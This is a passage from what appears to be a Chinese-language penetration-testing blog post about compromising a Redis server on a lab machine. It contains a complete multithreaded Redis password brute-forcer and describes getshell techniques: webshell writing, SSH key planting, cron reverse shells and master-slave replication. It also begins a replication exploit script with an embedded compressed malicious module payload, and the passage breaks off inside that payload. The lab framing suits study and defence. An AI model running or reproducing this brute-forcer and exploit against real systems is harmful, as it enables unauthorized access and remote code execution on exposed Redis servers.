class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">global</span> passContent,waitDict,result,finish</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&lt;&lt;&lt; Start from <span class="subst">&#123;self.thisName&#125;</span> &gt;&gt;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> waitDict[self.thisName]:</span><br><span class="line">            passwd = passContent.readline().decode()</span><br><span class="line">            <span class="keyword">if</span> passwd.find(pad) &gt; -<span class="number">1</span> <span class="keyword">and</span> passwd.rsplit(pad,<span class="number">1</span>)[<span class="number">1</span>] == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                passwd = passwd[:-<span class="built_in">len</span>(pad)]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> passwd != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">                s.connect(self.host)</span><br><span class="line">                payload = <span class="string">&quot;&quot;</span>.join(_redis_format(*line) <span class="keyword">for</span> line <span class="keyword">in</span> [</span><br><span class="line">                    [<span class="string">&quot;auth&quot;</span>, <span class="string">f&#x27;<span class="subst">&#123;passwd&#125;</span>&#x27;</span>] <span class="keyword">if</span> passwd <span class="keyword">else</span> []</span><br><span class="line">                ]).encode()</span><br><span class="line">                s.send(payload)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;+OK&#x27;</span> <span class="keyword">in</span> s.recv(<span class="number">1024</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;&gt;&gt;&gt; Success from <span class="subst">&#123;self.thisName&#125;</span> &lt;&lt;&lt;&quot;</span>)</span><br><span class="line">                    result = passwd</span><br><span class="line">                    s.close()</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                s.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                waitDict.update(&#123;self.thisName:<span class="literal">True</span>&#125;)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        finish = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_redis_format</span>(<span class="params">*redis_cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(redis_cmd) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">f&quot;*<span class="subst">&#123;<span class="built_in">len</span>(redis_cmd)&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> redis_cmd:</span><br><span class="line">        cmd += <span class="string">f&quot;<span class="subst">&#123;CRLF&#125;</span>$<span class="subst">&#123;<span class="built_in">len</span>(line)&#125;</span><span class="subst">&#123;CRLF&#125;</span><span class="subst">&#123;line&#125;</span>&quot;</span></span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goBrute</span>(<span class="params">host:<span class="built_in">str</span>,threadNum:<span class="built_in">int</span>,passList</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> passContent</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(passList,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            passContent = <span class="built_in">open</span>(passList,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;File not found...&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">raise</span>  Exception(<span class="string">&quot;File can&#x27;t be read...&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(passList,<span class="built_in">list</span>):</span><br><span class="line">        passContent = _<span class="type">List</span>(passList)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span>  Exception(<span class="string">&quot;Error passList...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(threadNum):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _Run(host).start()</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> finish:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">bool</span>(<span class="built_in">sum</span>(<span class="keyword">not</span> each <span class="keyword">for</span> each <span class="keyword">in</span> waitDict.values())):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&lt;&lt;&lt; bye!!! &gt;&gt;&gt;&quot;</span>)</span><br><span class="line">            passContent.close()</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;&lt;&lt;&lt; get result -&gt; <span class="subst">&#123;result&#125;</span> &gt;&gt;&gt;&quot;</span>) <span class="keyword">if</span> result <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&quot;&lt;&lt;&lt; failed... &gt;&gt;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        @ host = 目标地址</span></span><br><span class="line"><span class="string">        @ threadNum = 开启的线程数</span></span><br><span class="line"><span class="string">        @ passList = [filePath/List] 密码字典，可以是文件路径或纯列表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    password = [</span><br><span class="line">        <span class="string">&quot;123&quot;</span>,</span><br><span class="line">        <span class="string">&quot;123456&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1234567&quot;</span>,</span><br><span class="line">        <span class="string">&quot;23333&quot;</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="comment">#password = &quot;./password.txt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    goBrute(</span><br><span class="line">        host=<span class="string">&quot;192.168.111.142:6379&quot;</span>,</span><br><span class="line">        threadNum=<span class="number">5</span>,</span><br><span class="line">        passList=password,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+<p>然后先指定一个字典，这里我直接使用 <strong>kali</strong> 自带的字典好了 <code>/usr/share/wordlists/rockyou.txt</code> ，然后将调用的代码改一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">password = <span class="string">&quot;/usr/share/wordlists/rockyou.txt&quot;</span></span><br><span class="line">goBrute(</span><br><span class="line">    host=<span class="string">&quot;192.168.111.142:6379&quot;</span>,</span><br><span class="line">    threadNum=<span class="number">5</span>,</span><br><span class="line">    passList=password,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>简单运行一下，看起来已经能得到 <strong>redis</strong> 的认证密码 <strong>123456</strong> 了：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314211600.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314211600118"></p>
+<p>OK，那么尝试入侵靶机的 <strong>redis</strong> 试试：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314212129.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314212128974"></p>
+<p>显然是成功认证了，那么就可以使用靶机上的 <strong>redis</strong> 了。说到 <strong>redis</strong> ，实际上有 <strong>4</strong> 种方式来 <strong>getshell</strong> ，这里一一列举说明并尝试看看吧。</p>
+<ul>
+<li>
+<p>第一种，写 <strong>webshell</strong> ：</p>
+<p>emmm，这个原理其实也很简单，由于现在已经可以操作 <strong>redis</strong> 了，就可以把带有 <strong>[一句话]</strong> 的内容存在 <strong>键值对</strong> 中，然后将 <strong>redis数据库</strong> 导出到 <strong>web</strong> 目录中的 <strong>特定的文件名</strong> 中，比如 (.php、.jsp啥的) 就行了。</p>
+<p>那么这里先简单写一个 <strong>.html</strong> 文件试试：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314212937.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314212937892"></p>
+<p>看起来并没有成功，其实还有很多不确定的因素在里边的，比如 <strong>是否拥有写权限</strong> 这就很重要。一般高版本 <strong>redis</strong> 用户的权限都是极低的，当然也有可能是 <strong>web</strong> 目录没有写权限。</p>
+</li>
+<li>
+<p>第二种，写 <strong>ssh</strong> 密钥：</p>
+<p>这个就比较麻烦了，由于 <strong>redis</strong> 无法读本地文件，所以不知道靶机上具体拥有的用户有哪些，而 <strong>root</strong> 用户启动 <strong>redis</strong> 又几乎是不太可能的，况且高版本的 <strong>redis</strong> 默认是 <strong>redis</strong> 用户，权限极低。不过也可以简单试一试是否拥有写权限。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314213259.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314213259723"></p>
+<p>还是直接放弃吧，看得出来这个 <strong>redis</strong> 应该是个权限极低的 <strong>redis</strong> 用户了。</p>
+</li>
+<li>
+<p>第三种，写 <strong>计划任务</strong> 来反弹shell：</p>
+<p>至于 <strong>计划任务</strong> 也就是将内容写入 ，也就是将弹shell的语句写入 <strong>计划任务</strong> 中执行 。在 <strong>ubuntu</strong> 和 <strong>kali</strong> 中，得写到 <code>/var/spool/cron/crontabs/root</code> ，而 <strong>centos</strong> 得写入 <code>/var/spool/cron/root</code> 中。只是这玩意几乎是不太可能的。</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314214810.png?x-oss-process=image/auto-orient,1/interlace,1" alt="image-20210314214810353"></p>
+</li>
+<li>
+<p>第四种，依靠 <strong>主从复制</strong> 来执行命令：</p>
+<p>说到 <strong>主从复制</strong> 这应该是这几年的比较新颖的攻击方式了吧（据说是从 ctf 出的），这里就部分摘抄 <a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">链接</a> 说明一下好了。</p>
+<p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。</p>
+<p>为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p>简单来说也就是，在自己的 <strong>攻击服务器</strong> 上开一个 <strong>假的redis</strong> 服务器，然后让 <strong>靶机的redis</strong> 开启 <strong>主从模式</strong> 连接 <strong>假的redis</strong> 服务器。当 <strong>靶机的redis</strong> 连接过来后，向其发送一个恶意的 <strong>so</strong> 文件（比如包含执行系统命令函数）。然后连接 <strong>靶机的redis</strong> 去加载这个 <strong>so</strong> 文件里边的 <strong>邪恶函数</strong> ，即可能够执行命令了。</p>
+<p>简单图示：</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210314215252.png?x-oss-process=image/auto-orient,1/interlace,1" alt="img"></p>
+</li>
+</ul>
+<p>这里就直接个一个利用脚本吧：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> error, socket, AF_INET,SOCK_STREAM,SOL_SOCKET,SO_REUSEADDR</span><br><span class="line"><span class="keyword">from</span> zlib <span class="keyword">import</span> decompress</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">exp = decompress(<span class="string">b&#x27;x\x9c\xed&#125;\t`TE\xd6\xee\xbd\xddY:\x9d\xadIBh\xf6\x00\x01\x82@\x08\x8b\x98\x11\x81\x84\x10\x08&#123;$\x04\x01\xd1\xa6\x93t\x92\x86\xa4;\xf4\x82\x01\x1d\x88\xb2\xc8&quot;\n\xc2(\xe3\xa0F\xc7%.\xa3\xb8\xa0\x88\x8e\xc4e\x04\x1dG\xa3\xb8\x04u4.8aT@\\~\x141\xef\x9c\xbaU\x95\xee\xbau\x1b\xe7\x7f\xf3\xde\xff\xff\xef\xd9pso\x9d\xef\x9cS\xa7N-\xf7v\xdf\xaaSk\ngN1\xa9\xaa\xc2&gt;fe\x82\x82\xa9\x86,-\x9dG\xe9\x19\xf7r\x16\xa0\xe5*\xd1\xf0\xd7\xaet#\xbc\xd1\x8a\xf1\xa7WQ\xf8\x194\x91\xbf(\x17\x03G\xe3l\x8d\xda8;#\xec|\x92\x9a\xd4\x12\x1d.g:\x87\xdc\x12*\xc7\xce\x16*&#125;\xf1\xd1@EL\x04;\xc5\x8f\x8d\x9e\xe7\x82\\\xd4\xbf\x90\x1f\xf3\xe4Z8n\xa4\xd7c\xe8y&gt;\x1cA8\xb8+\x84O\x86\x90\xeeM\xf5\xb0O\x1c\x1c\xe7\xc3Q\x08\xc7H8\xba\xc0\x91\x08G\x1f8\xea\x94\xf0\xfc\xd3\xe0\xa8\xa0\xd7\xe8\xc2\xbe\xf4\xda\x0e\xc7\xc0\x10\x9dVz^\x06G\x12\x1c\x13\x15\xad\xceo\xa0\xf4j8\xae\xa2\xd7\xf9p\x14\xd0\xebmpL\x82\xc3\x01\xc7\x94\x10&#125;\xab\xe9\xd9\x0bG&lt;\xbd\x1e\x0c\xc7\x05!&lt;\x1b\xe18\x0f\x8e\xad4\x9d\x0b\xc7x8~C\xd3\x1b\xe8y.\x1c\xdb\xe1H\x87\xe3R8.\x83c\x01\x1c\x17R\xfcbz\x9e\x00\xc7dz\x1d\x1b\x92\xcf08\xba\xc3\x91\xadh\xed\x06?\xe5pl\xa2\xd7[\xe0h\x80\xa3\x14\x8eJ8\x96R\xfa%p\\\x0b\xc7\xd5p\xa4\x84\xe8\x1b\x05\xc7\x0c8\x06\xc0\xe1\xa2\xb4up$\xc3q%\x1cUp\xac\x80\xe3r8z)Z;\x1d\x07\xc7z8.R\x8c?\x0bC\xae\xfdp8\xe9\xf5&lt;Ek\x87n8\xa6R\xdaL\x89\xfcu\x06z\x8b\x85\xf4\x08\tO\x89\x81l\xad\x84\xe6\x83\xa3GHz\x11\x1cs\xe0\x18\x02G\x19\x1c\xa3\xe1\xc8\xa1\xd8pz\x9e\x0e\xc7 z\xdd\x95\x9e\x97\xd3s\x00\x8e\xd9!\xfa\xae\xa7g\x0f\x1c\x99!\xf4\xa1pL\x83#!\x84\xd6\x8f\x9e\x7fK\xcf\xd7\x18\x94\x03?5\x110\xfct\x83c,\xbd\xde\x0c\xc7Jz\x9d%\xf0\xa5\xc2\x81cAO\x9a^C\xcf\x16E\xff\xb9\x82\x9e\xcd\x02&#125;\x16=\xaf\xa2\xe7%\x11\xec\xeaO\xcf\x8bCh\xf5\xf4\x8cm\xc4F\x0f\xec\xc3\x8dEjCT\xf1\xb6m\x87\x1aT\xdb\xf5\xb6\x06\xa0g*\x96\rq\x8a\xed\xbak\xa22b\xd3\x94\x9c\x84\x8dK\x12\x86\xe7\xdd\x11\xa7\xa4\xe4\xbd\x9c`Q\xf2\x1a\x07\x14\xdbL\x851\xca\xc6u#\xcdi\xd3\xa3\x922L\x16\xf5\x1a\xa5&#123;\x83&#125;\xd4\xefO\xb5e*\xee\xb4\xe2glQ\xa6\x02\x9b\x92u\xdd\x10&#123;\x83M\xedr\x8d\xcd\x92gR\x9a\xa2\xb76\xad\x1dm\xb3l\x8b\xca\xb0\xda\xa6\xefO\xceW\xce\xbf\x0bj=\x03\xed\xc0\xbe\x82\xe3\x0e\xfa\xb3&#123;\x88\x9f\xf0\x83cY\x06\xbd\xc6\xba\xc3&gt;\x84u\x8cm\x03\xc7\x07\xf45\x8e\t\xc3(\x0f\xb6\x1fl\xaf\xd8\x9e\xb0\xdf\x8d\xa6t\x1cKq\x0c\xc4\xfa\xc2q\x03\xc7\x02\xecc\xd8\xbf&amp;P\x9e&lt;E\x1b\xabp|\xc2\xf1\n\xc7\x06\x1c\xa3\xb0\x0fa;b&#125;\x08\xfb\x07\x8e1\xf3i\x1a\xc7\x16\xec\x8b\xd8\xae/\xa5~\xbf\x9cb8\xce-\t\xf1=\xb6w\x1c\x1b\xb1o\xb2qc\x19=c\xdf\xc16\x8cc2\xb6u\xec7\xd8\xd6Y\x9b\xc0:\xc46v%Mc\x1b\xc6q\x93\xb5\&#x27;\xfc4(Z\x9b\xc6\xf1\x7f\x1d\xa5\xe1\x98\x84c\&#x27;\x8e[\xd8Wp\x0c\xde\x1e&quot;S\xf3l\xd6\x94\xab?\xb9/\xba2a\xce\xe0\x89-U\x03Z.\xb9\xf5\xc4C\x07o\x9cy\xd9\x93w\xbc\xe1+[\xff\xc5\x8c\x82\xebK\xda\x96\xde6\xf0\xf6\xe7r\x97\xf7\xba\xef\xb3\xc6\x07\xe6\x05/\xaf\xf0\x1d\xbd\xf8\xd1\xbb&lt;\xd3?\xbe\xec\xa7\xa4\xd7\x87\xdd\xf6\xdd\x84Y\x9f\x8e\xfc\xc3\xbb\xbbN\xb96\\_R\x96\xb7k\xc3\x90Mk[\xd7\xce\xcdzpF\xf2\x9e\&#x27;~\x1c~\xd4\x7f\xf3(\xf5@\xd4\xc6\xd1O\x9c\xed\xb9\xf8\xa6\xa1]\xdf,\xea\x7fG|\xf3\x99\xe0G\x83\x8e\xdd\xb5\xfe\xf6)\xf3\&#x27;9\xfer\xfd\x0fI\x17\xec&#123;\xfaw_M\x9b\xd4\xff\xd2n3\xdf\xfc&#123;\xc9M\x1br\x8f\xb8\xbey\xf2\x92\x87:*V\x9f\xd8\x15wC\xe2\x80\x82\xc2\xb7\xbf\x8c\x1f\xf2\x9b\xc7\x9a\x86N:\xb6\xf5\xe5\x1bvf]\xb3\xe9j\xe7\xed\x83\xdez\xf8\xba\x01\xcfT\xbd\xf3\xfa\x84\xbd;\xaa\xdey\xdb\xb3\xa8p\xd8U\xaf\xfe\xf4\xee\xe4#E\xce[\xdb\x1e\xda\xd6\xfd\xc8\x8e\xa7Ko\x1d;6/e\xdd+\xb6\x83\xe5\x8f\xdc\xb8\xc4\xfd\xde\xea\xe5\x837,\xf5\x9e\xaa\xb9w\xd2\xc2[\x0b\xbbM\xdd\x9fZ\xfd\xfc\xd1\xea\xf9\xc7\xbf\xbfo\xdd\xd2\xfb\xcf\xcb\xba\xaa\xf8\xb6\xaeck&#123;\xbd\xb2\xab\xf9\xdd\xaa\xbb\xfc+?\x18td\xf9\x82^\xaf\xffm\xd5\xfa\xef\x9arN\xbf\xbf\xa6f\xf6R\xf5\xcbq\xdd\xbaL;\xf1\xf4\xa77^\x95|r\xb6i\xea\x89\xa7\xde\xbbl]rKL\xcb\xe7/\x9dj9zq\xd9\xc5\xcb\xeb&#123;$\xf5;z\xff?\xc6]r\xf7\xdd\x85O\xab\xfe\xc2\x1e\x7fX\xdd\xf3\x86\x19\xb7\xfcv\xb9b\x8d.\xbd\xf6\xf5\x0fo\xaf\xbaoo\xb0\xec\x83\x1f\x93\xd6\x7f\xde\xba\xe3\x92\xc3\x7f\xb9\xf4\x80o\xee\x9dS.\xda\xf9\xcf\xf5E\x9b\xb7\xd8N\r\x9b\xf9\xe5C\xb5\xc7oMj:Y\xf2\xc7\xab\xae&lt;&#123;S\xd27\xdf\xce\xf8)\xe9\xb1\xf1o?wQ\x97o\x93\xe27\x9e\xed\x7fm\xd5\xd0\xe3_\xafoj\x18\xf7I\xcfw\x94g\xffc\xe1\xd7\xc1\xfb\xd7\xf4\xdd\x9ba/\x18\xf0\xe7\xbf\xa4\x8f&gt;~\xd6\xf6\xf4\xe8\&#x27;\x1ey\xf5\x8d\xa2\xa7\xf2+\&#x27;\xcd]S\xfa\x1f\t\xd7l\xb8\xe0\xfd\x0f\xbf\xba\xd2\xe3y\xadr\xff\x91\xd6\x1d\x97\xae\x1d\xb2c\xe6\xdc#\xf7\x1c&gt;U:\xa0\xcb\xc1\xbf\x0fr?\xf9]\x92\x12\xe1\x13H\x08\xbf\xa7\xb1\xcf\xcd\x06\xf4\x83\x06\xf4\x0f\x0c\xe8\xdb\x0c\xe8\x9b\r\xe8\x1f\x1b\xd0\xffl@\xaf5\xa0_i@\xaf2\xa0\xef3\xa0\xaf5\xa0\xbfe@\xff\x9b\x01=\xd1\x82\xcfgI\xca\xc9\xe2\x0c\x92f\xf7\x88\xf1\xf1\x1a\xddrq8\xfdH\x9cF\xcf\x99\x1bN\x7f\xc1\xa4\xd1\xed%\xe1\xf4\x1f\x15\x8d\xbeD\xe0_\x10\xad\xd1w\t\xf4\xa3Q\x1a\xbdZ\xd0\xf3\x0c\xcdw\x8f`\xe7`\xaa\&#x27;K\xd03^\xd5\xe8-\x82\x9eA\xb4\xbc\xca\xbcp\xfa&gt;\xca\x7fH\xd0?\x91\xf2\xdb\x05\xfe\x12j\xcf!!\xdfRj\xff\x02!\xdf\xab\xac\x1a\xfd\xb4@\xff\x86\xda\xaf\x08\xf4;\xa9\xfe,\xc1\xff\xf3\x99\xfdB\xbe]\xa8\x9e\x06\x81\x8e\xf7,\xa4g\x88zb4z\xbb@\x9fA\xf9\x9b\x04?,\xa5\xf6\x9c\x14\xf4\xd7\xd0\xf2\xb6\x0b\xfc\x17Rz\x9e\xa0_\x8d\xa5\xf5&quot;\xd0WS\xffg\x08\xfa\xff\xc2\xda\x89\xc0\x9f\xca\xec\x14\xdb\&#x27;\xe5\xb7\x0bz\x0eP&#123;\xda\x04;\xaf\xa6\xfe\xdc&amp;\xf8\xdf\x94@\xdb\xbfP\xef\x7f\xa1\xf9V\x0b\xfa\xb7Pz\x83`\xcf)\xea\xb7F\x81\xff^Z\xdejA\xff^j\xcfFAO#\xed_\xcd\x02\xfd\x1e\xda\xae\x1a\x04\xfb\xe7\x98i\xbd\x08\xf4\xe8D|\x16KT\xb6Q?\xb0O&amp;\xd5\x9f%\xd8\xf3\x01-W\x9d\x90\xef\x0f\x94\xbfX\xe0o&quot;\xe3L\x9c\xb26WK\x8f\xa3_\xf4\x82\xb4\xbd\xb5\t\xf6\x0c\xa3~.\x12\xe8\xc7i;\xc9\x13\xe8\xcb\x99=\x02&#125;\x15\x1d\xaf\xf6\t\xf5\xbb\x83\xfay\x9f\xe0\xffXj\xffFA\xcf\x83\xd4o\xadb\xfb\xa1~n\x14\xfc\xf0\t\xd5\x93#\xf8\xe12\xea\x878\xfa\x85r\x15\xf5\xc3p\xaa\x7f\x9b\xa0\xe7&amp;Z\xde=\x02&#125;)\xe3\x17\xca\xd5\x8d\xb6\xab\x16\x81\xaeR\xff\x14\x0b\xf6\x8f\xa5\xfeo\x12\xe8\x1e\xda_\x9a\x04?|I\xfdyR\xa07\xd2~T,\xd8\x99F\xfd\xb3D\xa0\x8f\xa2\xf4\x16!\xdf2\xea\xb7&quot;\xc1oWR\xfai\x81\xff\xf7\xd4\xfe&lt;\x81